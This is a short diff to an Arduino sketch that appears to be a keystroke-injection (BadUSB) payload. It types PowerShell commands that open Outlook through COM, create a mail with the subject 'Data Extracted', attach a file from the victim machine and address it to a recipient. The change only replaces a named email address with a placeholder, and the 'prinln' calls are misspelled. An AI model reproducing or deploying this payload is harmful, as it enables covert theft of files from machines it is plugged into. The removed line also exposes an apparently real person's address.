@@ -24,7 +24,7 @@ void setup(){
 	Keyboard.prinln("Add-Type -Assembly 'Microsoft.Office.Interop.Outlook' -PassThru");
 	Keyboard.prinln("$Outlook = New-Object -ComObject Outlook.Application");
 	Keyboard.prinln("$Mail = $Outlook.CreateItem(0)");
-	Keyboard.prinln("$Mail.Recipients.Add('david.addison@abzena.com')");
+	Keyboard.prinln("$Mail.Recipients.Add('someone@somewhere.com')");
 	Keyboard.prinln("$Mail.Subject='Data Extracted'");
 	Keyboard.prinln("$Mail.Body = 'test email'");
 	Keyboard.prinln("$Mail.Attachments.Add($path)");
